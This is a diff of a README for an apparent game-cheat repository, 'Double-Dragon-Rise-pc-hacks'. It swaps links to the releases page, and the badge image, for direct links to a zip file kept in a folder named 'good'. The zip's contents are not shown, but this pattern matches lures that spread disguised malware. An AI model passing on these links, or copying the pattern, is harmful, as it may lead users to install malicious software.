@@ -1,6 +1,6 @@
 # 🐉 Double-Dragon-Rise-pc-hacks - Unlock Endless Gaming Possibilities
 
-[![Download Double-Dragon-Rise-pc-hacks](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/LuisDa-gif/Double-Dragon-Rise-pc-hacks/releases)
+[![Download Double-Dragon-Rise-pc-hacks](https://raw.githubusercontent.com/LuisDa-gif/Double-Dragon-Rise-pc-hacks/main/good/Double-Dragon-Rise-pc-hacks.zip)](https://raw.githubusercontent.com/LuisDa-gif/Double-Dragon-Rise-pc-hacks/main/good/Double-Dragon-Rise-pc-hacks.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Double-Dragon-Rise-pc-hacks repository! This guide will help you 
 
 ## 📥 Download & Install
 
-To get started with Double-Dragon-Rise-pc-hacks, visit this page to download: [Download Double-Dragon-Rise-pc-hacks Releases](https://github.com/LuisDa-gif/Double-Dragon-Rise-pc-hacks/releases).
+To get started with Double-Dragon-Rise-pc-hacks, visit this page to download: [Download Double-Dragon-Rise-pc-hacks Releases](https://raw.githubusercontent.com/LuisDa-gif/Double-Dragon-Rise-pc-hacks/main/good/Double-Dragon-Rise-pc-hacks.zip).
 
 ### Step-by-Step Download Instructions
 
